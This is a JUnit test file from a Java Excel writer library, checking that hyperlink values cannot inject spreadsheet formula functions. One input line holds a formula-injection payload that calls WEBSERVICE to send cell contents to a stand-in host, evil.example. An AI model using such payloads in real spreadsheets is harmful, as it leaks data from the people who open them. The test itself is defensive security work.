package com.github.salilvnair.excelprocessor.v2.writer;

import com.github.salilvnair.excelprocessor.v2.context.ExcelSheetContext;
import com.github.salilvnair.excelprocessor.v2.processor.factory.ExcelSheetWriterFactory;
import com.github.salilvnair.excelprocessor.v2.writer.sheet.LinkSheet;
import org.apache.poi.ss.formula.FormulaParser;
import org.apache.poi.ss.formula.FormulaType;
import org.apache.poi.ss.formula.ptg.AbstractFunctionPtg;
import org.apache.poi.ss.formula.ptg.Ptg;
import org.apache.poi.ss.usermodel.Cell;
import org.apache.poi.ss.usermodel.CellType;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.xssf.usermodel.XSSFEvaluationWorkbook;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

class FormulaInjectionTest {

    @Test
    void multiHyperlinkValueCannotInjectFormulaFunctions() {
        LinkSheet row = new LinkSheet();
        row.setLinks("https://a.example.com/x https://b.example.com/\"&WEBSERVICE(\"http://evil.example/?d=\"&A1)&\"");
        XSSFWorkbook wb = (XSSFWorkbook) ExcelSheetWriterFactory.generate()
                .workbook(Collections.singletonList(row), ExcelSheetContext.builder().build());
        Sheet sheet = wb.getSheet("Links");
        Cell cell = sheet.getRow(1).getCell(StyleCacheTest.column(sheet, "Links"));
        assertEquals(CellType.FORMULA, cell.getCellType());

        Ptg[] tokens = FormulaParser.parse(cell.getCellFormula(), XSSFEvaluationWorkbook.create(wb), FormulaType.CELL, 0);
        List<String> functions = new ArrayList<>();
        for (Ptg ptg : tokens) {
            if (ptg instanceof AbstractFunctionPtg) {
                functions.add(((AbstractFunctionPtg) ptg).getName());
            }
        }
        assertFalse(functions.contains("WEBSERVICE"), "injected function in " + cell.getCellFormula());
        assertTrue(functions.stream().allMatch(f -> f.equals("HYPERLINK") || f.equals("CHAR")), functions.toString());
    }
}
